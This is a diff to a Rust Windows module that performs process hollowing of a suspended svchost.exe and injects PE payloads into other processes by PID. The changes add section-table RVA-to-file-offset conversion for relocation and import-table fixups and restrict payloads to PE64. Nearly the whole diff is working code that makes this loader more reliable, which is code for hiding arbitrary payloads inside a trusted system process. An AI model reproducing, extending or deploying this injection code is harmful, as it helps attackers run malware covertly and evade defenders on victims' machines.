@@ -1,6 +1,35 @@
 use anyhow::{anyhow, Result};
 #[cfg(windows)]
-use std::ffi::c_void;
+use winapi::ctypes::c_void;
+
+/// Convert a Relative Virtual Address (RVA) from the PE optional-header data
+/// directories to a raw file offset by walking the section table.
+///
+/// The data-directory fields (e.g. `IMAGE_DIRECTORY_ENTRY_BASERELOC`,
+/// `IMAGE_DIRECTORY_ENTRY_IMPORT`) store *virtual* addresses relative to the
+/// image base, **not** offsets into the on-disk file.  Using an RVA directly
+/// as a file offset is only accidentally correct for packed/aligned images
+/// where `VirtualAddress == PointerToRawData`.  For general PE files the two
+/// values differ and we must walk the section headers.
+#[cfg(windows)]
+unsafe fn rva_to_file_offset(
+    rva: usize,
+    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
+) -> usize {
+    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
+    let sections = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
+        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+    for i in 0..num_sections {
+        let sec = &*sections.add(i);
+        let va = sec.VirtualAddress as usize;
+        let vs = *sec.Misc.VirtualSize() as usize;
+        if rva >= va && rva < va + vs {
+            return rva - va + sec.PointerToRawData as usize;
+        }
+    }
+    // Fallback: header area (rva < SizeOfHeaders) maps 1:1.
+    rva
+}
 
 /// Hollow a new suspended svchost.exe process and execute the provided PE payload inside it.
 #[cfg(windows)]
@@ -53,6 +82,16 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         }
         if (*nt).Signature != IMAGE_NT_SIGNATURE {
             return Err(anyhow!("hollow_and_execute: invalid NT signature"));
+        }
+        // Only PE64 (OptionalHeader Magic = 0x020B) is supported.  Reading
+        // OptionalHeader fields through IMAGE_NT_HEADERS64 on a 32-bit PE
+        // (Magic = 0x010B) would read from wrong offsets and produce garbage.
+        let opt_magic = (*nt).OptionalHeader.Magic;
+        if opt_magic != winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC {
+            return Err(anyhow!(
+                "hollow_and_execute: only PE64 payloads are supported (found OptionalHeader.Magic=0x{:x})",
+                opt_magic
+            ));
         }
 
         let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
@@ -244,19 +283,22 @@ unsafe fn apply_relocations_remote(
         .DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
     if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 { return Ok(()); }
 
-    let reloc_start = reloc_dir.VirtualAddress as usize;
-    let reloc_end = reloc_start + reloc_dir.Size as usize;
-    if reloc_end > payload.len() { return Ok(()); }
+    // Convert the relocation-directory RVA to a file offset.  The data-directory
+    // VirtualAddress is a PE RVA, not a raw file offset; they differ when the
+    // .reloc section has a different PointerToRawData than VirtualAddress.
+    let reloc_file_off = rva_to_file_offset(reloc_dir.VirtualAddress as usize, nt);
+    let reloc_end_off  = reloc_file_off + reloc_dir.Size as usize;
+    if reloc_end_off > payload.len() { return Ok(()); }
 
-    let mut offset = reloc_start;
-    while offset + 8 <= reloc_end {
+    let mut offset = reloc_file_off;
+    while offset + 8 <= reloc_end_off {
         let page_rva = u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
         let block_size = u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
         if block_size < 8 { break; }
         let entries = (block_size - 8) / 2;
         for i in 0..entries {
             let entry_off = offset + 8 + i * 2;
-            if entry_off + 2 > reloc_end { break; }
+            if entry_off + 2 > reloc_end_off { break; }
             let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
             let typ = (entry >> 12) as u8;
             let rel = (entry & 0x0FFF) as usize;
@@ -350,6 +392,15 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             if (*nt).Signature != IMAGE_NT_SIGNATURE {
                 close_h!(hprocess);
                 return Err(anyhow!("inject_into_process: invalid NT signature"));
+            }
+            // Only PE64 (Magic = 0x020B) is supported.
+            let opt_magic = (*nt).OptionalHeader.Magic;
+            if opt_magic != winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC {
+                close_h!(hprocess);
+                return Err(anyhow!(
+                    "inject_into_process: only PE64 payloads are supported (found Magic=0x{:x})",
+                    opt_magic
+                ));
             }
 
             let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
@@ -497,16 +548,29 @@ unsafe fn fix_iat_remote(
         .DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
     if import_dir.VirtualAddress == 0 { return Ok(()); }
 
-    let mut desc_off = import_dir.VirtualAddress as usize;
+    // Convert import-directory RVA to file offset.  Each field in the import
+    // descriptor (OriginalFirstThunk, Name, FirstThunk) is also an RVA and
+    // must be converted before using it as a payload index.
+    let mut desc_off = rva_to_file_offset(import_dir.VirtualAddress as usize, nt);
     loop {
         if desc_off + 20 > payload.len() { break; }
-        let orig_first_thunk = u32::from_le_bytes(payload[desc_off..desc_off+4].try_into().unwrap()) as usize;
+        let orig_first_thunk_rva = u32::from_le_bytes(payload[desc_off..desc_off+4].try_into().unwrap()) as usize;
         let name_rva = u32::from_le_bytes(payload[desc_off+12..desc_off+16].try_into().unwrap()) as usize;
-        let first_thunk = u32::from_le_bytes(payload[desc_off+16..desc_off+20].try_into().unwrap()) as usize;
+        let first_thunk_rva = u32::from_le_bytes(payload[desc_off+16..desc_off+20].try_into().unwrap()) as usize;
         if name_rva == 0 { break; }
-        if name_rva >= payload.len() { desc_off += 20; continue; }
 
-        let dll_name_bytes = &payload[name_rva..];
+        // Convert all three RVAs to file offsets.
+        let name_off         = rva_to_file_offset(name_rva, nt);
+        let first_thunk_off  = rva_to_file_offset(first_thunk_rva, nt);
+        let thunk_rva_off    = if orig_first_thunk_rva != 0 {
+            rva_to_file_offset(orig_first_thunk_rva, nt)
+        } else {
+            first_thunk_off
+        };
+
+        if name_off >= payload.len() { desc_off += 20; continue; }
+
+        let dll_name_bytes = &payload[name_off..];
         let null_pos = dll_name_bytes.iter().position(|&b| b == 0).unwrap_or(dll_name_bytes.len());
         let dll_name_str = match std::str::from_utf8(&dll_name_bytes[..null_pos]) {
             Ok(s) => s,
@@ -560,9 +624,11 @@ unsafe fn fix_iat_remote(
             continue;
         }
 
-        let thunk_rva = if orig_first_thunk != 0 { orig_first_thunk } else { first_thunk };
-        let mut thunk_off = thunk_rva;
-        let mut iat_off  = first_thunk;
+        let thunk_rva = if orig_first_thunk_rva != 0 { orig_first_thunk_rva } else { first_thunk_rva };
+        let mut thunk_off = thunk_rva_off;   // file offset into INT (import name table)
+        let mut iat_off   = first_thunk_off; // file offset into IAT (import address table)
+        let thunk_rva_base = thunk_rva; // needed to keep running RVA for IMAGE_IMPORT_BY_NAME
+        let _ = thunk_rva_base;
         loop {
             if thunk_off + 8 > payload.len() { break; }
             let thunk_val = u64::from_le_bytes(payload[thunk_off..thunk_off+8].try_into().unwrap());
@@ -574,9 +640,11 @@ unsafe fn fix_iat_remote(
                 let ep = GetProcAddress(dll_base as _, ord as _);
                 ep as usize
             } else {
+                // Named import: thunk_val is an RVA to IMAGE_IMPORT_BY_NAME
                 let ibn_rva = (thunk_val & 0x7FFF_FFFF) as usize;
-                if ibn_rva + 2 >= payload.len() { thunk_off += 8; iat_off += 8; continue; }
-                let name_start = ibn_rva + 2; // skip 2-byte Hint
+                let ibn_off = rva_to_file_offset(ibn_rva, nt);
+                if ibn_off + 2 >= payload.len() { thunk_off += 8; iat_off += 8; continue; }
+                let name_start = ibn_off + 2; // skip 2-byte Hint
                 let name_bytes = &payload[name_start..];
                 let nlen = name_bytes.iter().position(|&b| b == 0).unwrap_or(name_bytes.len());
                 let mut name_null = name_bytes[..nlen].to_vec();
